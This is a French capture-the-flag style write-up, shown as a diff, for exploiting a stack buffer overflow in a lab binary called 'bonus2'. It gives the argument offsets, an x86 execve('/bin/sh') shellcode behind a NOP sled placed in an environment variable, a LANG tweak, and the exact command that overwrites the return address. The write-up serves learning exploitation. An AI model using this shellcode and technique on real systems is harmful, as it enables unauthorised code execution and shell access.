@@ -1,0 +1,26 @@
+Dans ce binaire il est possible de passer 2 arguments en parametres.
+Ces arguments sont copies dans un buffer statique de 80 byte.
+Nous avons donc tente de faire SEGV le programme en lui passant des tailles
+de chaine de caracteres differentes. Nous avons trouve un offset de 23 bytes pour le
+second arguement. Quant au premier il doit faire 40 byte.
+Nous avons donc ecrit un shell code dans une variable d'environnement
+
+export TMP=$(python -c "print '\x90' * 5000 +
+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
+
+Nous avons aussi changer la variable LANG dans l'environnement pour que le message
+soit plus long.
+
+export LANG="nl"
+
+```
+int main(int argc, char *argv[])
+{
+    char* ptr = getenv("TMP");
+    printf("%p\n", ptr);
+}
+```
+
+./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 23 + '\xaf\xeb\xff\xbf'")
+
+\xaf\xeb\xff\xbf = adresse de la variable d'environnement
